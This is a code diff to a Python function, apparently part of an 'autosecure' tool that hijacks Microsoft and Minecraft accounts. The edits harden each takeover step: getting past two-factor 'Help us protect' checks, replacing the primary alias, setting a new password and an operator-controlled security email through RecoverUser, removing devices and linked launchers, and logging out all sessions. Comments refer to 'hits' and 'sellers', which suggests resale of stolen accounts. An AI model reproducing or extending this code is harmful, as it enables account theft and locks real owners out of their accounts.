@@ -228,9 +228,12 @@ async def secure(session: httpx.AsyncClient, command: bool, recovery: bool, acco
     try:
         verification_tokens = await get_amc(session)
     except Exception as exc:
-        log.exception("get_amc failed")
-        print(f"[X] - get_amc failed: {exc}")
-        raise
+        from securing.utils.proxy import format_exception_reason
+
+        detail = format_exception_reason(exc)
+        log.exception("get_amc failed: %s", detail)
+        print(f"[X] - get_amc failed: {detail}")
+        raise RuntimeError(f"get_amc failed: {detail}") from exc
 
     apicanary = await get_cookies(session)
     if not apicanary:
@@ -260,8 +263,9 @@ async def secure(session: httpx.AsyncClient, command: bool, recovery: bool, acco
         if outcome != "transient":
             break
         if attempt < mc_attempts:
-            # 429 from login_with_xbox needs longer gaps under bulk parallel load
-            delay = min(10.0 * attempt, 45.0)
+            # Fixed short gap — old 10s×attempt (capped 45s) burned ~2.5min on
+            # proxy/XBL races that usually clear on the next try within seconds.
+            delay = 5.0
             print(f"[~] - MC check inconclusive (attempt {attempt}/{mc_attempts}), retrying in {delay:.0f}s...")
             log.warning("MC check transient failure attempt %s/%s — sleeping %.1fs", attempt, mc_attempts, delay)
             await asyncio.sleep(delay)
@@ -349,30 +353,37 @@ async def secure(session: httpx.AsyncClient, command: bool, recovery: bool, acco
     has_recovery = bool(
         existing_recovery and existing_recovery not in ("Couldn't Change!", "Failed to generate")
     )
+    # Prefer previously-secured password for i5600 MFA (seller TOTP pwd is often stale).
+    i5600_password = ms.get("secured_password") or ms.get("password")
 
     security_parameters = None
     try:
         # After recover we already have password + recovery. Skip proofs OTP only when
         # we are NOT changing primary alias — names/manage needs SA elevation (i5600).
+        # Already-sunny re-secures: skip i5600 entirely (MS rejects GOTC with 203/204).
+        already_sunny = _is_autosecure_sunny_primary(ms.get("email"))
+        skip_i5600 = has_recovery and (not replace_alias or already_sunny)
         security_parameters = json.loads(
             await security_information(
                 session,
                 security_email=ms.get("security_email"),
                 account_email=ms.get("email"),
-                password=ms.get("password"),
-                skip_i5600_otp=has_recovery and not replace_alias,
+                password=i5600_password,
+                skip_i5600_otp=skip_i5600,
             )
         )
     except RuntimeError as exc:
         # i5600 "Help us protect" often blocks proofs/Manage after recover already
-        # succeeded. Soft-continue so the hit is not lost — keep recovery code,
-        # still run MC / API cleanup that does not need t0.
+        # succeeded — or on re-secure when GetOneTimeCode returns 203/204.
+        # Soft-continue when we have a recovery code so RecoverUser can still run.
         msg = str(exc)
-        if has_recovery and (
+        i5600_blocked = (
             "could not find var t0" in msg
+            or "Help-us-protect" in msg
             or "i5600" in msg
             or "proofs page" in msg
-        ):
+        )
+        if has_recovery and i5600_blocked:
             log.warning(
                 "security_information soft-skip after recover for %s: %s",
                 ms.get("email"),
@@ -465,10 +476,18 @@ async def secure(session: httpx.AsyncClient, command: bool, recovery: bool, acco
             account_info["microsoft"]["has_sms_proof"] = None
 
         # Third Party Launchers (Minecraft, Prism)
-        await remove_services(session)
+        try:
+            await remove_services(session)
+        except Exception as exc:
+            log.warning("remove_services soft-fail: %s", exc)
+            print(f"[!] - remove_services skipped ({exc.__class__.__name__})")
 
         # Remove Microsoft Devices
-        await remove_devices(session, verification_tokens["devices"], devices)
+        try:
+            await remove_devices(session, verification_tokens["devices"], devices)
+        except Exception as exc:
+            log.warning("remove_devices soft-fail: %s", exc)
+            print(f"[!] - remove_devices skipped ({exc.__class__.__name__})")
 
         # Seed login email before alias replace (updated only if MakePrimary wins)
         if main_email:
@@ -540,68 +559,80 @@ async def secure(session: httpx.AsyncClient, command: bool, recovery: bool, acco
         else:
             account_info["microsoft"]["primary_alias_replaced"] = None
 
-        if security_parameters:
-            if recovery:
+        # RecoverUser needs a usable recovery code — NOT security_parameters/t0.
+        # When i5600 blocks proofs Manage we soft-skip (security_parameters=None)
+        # but must still mint a new password + security email via RecoverUser.
+        can_recover = bool(
+            recovery
+            and recovery_code
+            and recovery_code not in ("Couldn't Change!", "Failed to generate", "invalid")
+        )
+        if can_recover:
 
-                security_email = uuid.uuid4().hex[:16]
-                from securing.utils.security.password_gen import generate_ms_password
-                password = generate_ms_password(14)
+            security_email = uuid.uuid4().hex[:16]
+            from securing.utils.security.password_gen import generate_ms_password
+            password = generate_ms_password(14)
 
-                security_email = f"{security_email}@{domain}"
-                print(f"[+] - Generated Security Email ({security_email})")
-                with DBConnection() as database:
-                    database.add_security_email(security_email, password)
+            security_email = f"{security_email}@{domain}"
+            print(f"[+] - Generated Security Email ({security_email})")
+            with DBConnection() as database:
+                database.add_security_email(security_email, password)
 
-                # RecoverUser must use the *current* primary. After MakePrimary the
-                # sunny@ alias is the login identity — resetting against the old
-                # Outlook address often fails parse / leaves sellers with a dead
-                # "Login Email" that no longer works.
-                recover_login = (
-                    str(
-                        (account_info.get("microsoft") or {}).get("email")
-                        or main_email
-                        or ""
-                    ).strip()
+            # RecoverUser must use the *current* primary. After MakePrimary the
+            # sunny@ alias is the login identity — resetting against the old
+            # Outlook address often fails parse / leaves sellers with a dead
+            # "Login Email" that no longer works.
+            recover_login = (
+                str(
+                    (account_info.get("microsoft") or {}).get("email")
                     or main_email
+                    or ""
+                ).strip()
+                or main_email
+            )
+            if not security_parameters:
+                print(
+                    "[!] - RecoverUser without proofs t0 "
+                    "(i5600 soft-skip / no security_parameters)"
                 )
-                print(f"[~] - Automaticly Securing Account... ({recover_login})")
-                try:
-                    data = await recover(
-                        session,
-                        recover_login,
-                        recovery_code,
-                        security_email,
-                        password,
-                    )
-                except Exception as exc:
-                    # Keep sunny@ / original_email already written above so give-back
-                    # embeds never fall back to the deleted Outlook primary.
-                    logging.exception(
-                        "RecoverUser failed after alias steps for %s (login=%s)",
-                        main_email,
-                        recover_login,
-                    )
-                    print(
-                        f"[X] - RecoverUser failed ({exc.__class__.__name__}: {exc}) "
-                        f"— primary kept as {recover_login}"
-                    )
-                    account_info["microsoft"]["recover_error"] = (
-                        f"{exc.__class__.__name__}: {exc}"
-                    )
-                    raise
+            print(f"[~] - Automaticly Securing Account... ({recover_login})")
+            try:
+                data = await recover(
+                    session,
+                    recover_login,
+                    recovery_code,
+                    security_email,
+                    password,
+                )
+            except Exception as exc:
+                # Keep sunny@ / original_email already written above so give-back
+                # embeds never fall back to the deleted Outlook primary.
+                logging.exception(
+                    "RecoverUser failed after alias steps for %s (login=%s)",
+                    main_email,
+                    recover_login,
+                )
+                print(
+                    f"[X] - RecoverUser failed ({exc.__class__.__name__}: {exc}) "
+                    f"— primary kept as {recover_login}"
+                )
+                account_info["microsoft"]["recover_error"] = (
+                    f"{exc.__class__.__name__}: {exc}"
+                )
+                raise
 
-                if data and data != "invalid":
-                    account_info["microsoft"]["security_email"] = security_email
-                    account_info["microsoft"]["recovery_code"] = data
-                    account_info["microsoft"]["password"] = password
-                else:
-                    print(f"[X] - Failed to secure this account")
-                    account_info["microsoft"]["recover_error"] = (
-                        "RecoverUser returned no recovery code"
-                    )
-                    raise RuntimeError(
-                        "RecoverUser returned no recovery code after primary alias change"
-                    )
+            if data and data != "invalid":
+                account_info["microsoft"]["security_email"] = security_email
+                account_info["microsoft"]["recovery_code"] = data
+                account_info["microsoft"]["password"] = password
+            else:
+                print(f"[X] - Failed to secure this account")
+                account_info["microsoft"]["recover_error"] = (
+                    "RecoverUser returned no recovery code"
+                )
+                raise RuntimeError(
+                    "RecoverUser returned no recovery code after primary alias change"
+                )
 
         # Delete other login aliases (non-fatal — manage page often lacks canary)
         # Always keep the current primary so a failed MakePrimary doesn't orphan-delete
@@ -652,9 +683,14 @@ async def secure(session: httpx.AsyncClient, command: bool, recovery: bool, acco
         else:
             print("[~] - enable_2fa is off — skipping authenticator")
 
-        # Logout all devices
+        # Logout all devices (non-fatal — proxy ConnectTimeout here used to abort
+        # an otherwise fully secured account and return a false failure to sellers).
         if apicanary:
-            await logout_all(session, apicanary)
+            try:
+                await logout_all(session, apicanary)
+            except Exception as exc:
+                logging.warning("logout_all soft-skip: %s", exc)
+                print(f"[~] - Skipping logout_all ({exc.__class__.__name__})")
         else:
             print("[!] - Skipping logout_all (no apiCanary)")
 
